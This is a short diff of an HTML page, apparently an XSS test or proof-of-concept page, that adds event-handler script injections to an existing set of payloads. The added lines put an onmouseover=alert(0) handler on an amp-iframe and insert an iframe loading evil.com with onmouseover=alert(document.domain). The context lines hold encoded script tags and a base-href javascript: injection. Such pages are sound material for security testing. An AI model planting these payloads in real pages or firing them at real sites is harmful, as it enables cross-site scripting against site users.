@@ -36,7 +36,7 @@ include 'log.php';
     <p>&#x22;&#x3E;&#x3C;img src=x&#x3E;&#x3C;script&#x3E;alert(0)&#x3C;/script&#x3E;</p>
 
 
-  <amp-iframe width="300"
+  <amp-iframe onmouseover=alert(0) width="300"
   title="Netflix House of Cards branding: The Stack"
   height="300"
   layout="responsive"           
@@ -46,6 +46,7 @@ include 'log.php';
   src="https://www.google.com/chromesuggestions?t=0">
      <amp-img layout="fill" src="https://foo.com/foo.png" placeholder></amp-img>
 </amp-iframe>
+    <iframe onmouseover=alert(document.domain) src=http://evil.com></iframe> 
 
 <textarea>xxxe.com/"><base href="javascript:\"><a href="/xss//alert(document.domain)"></textarea>
 
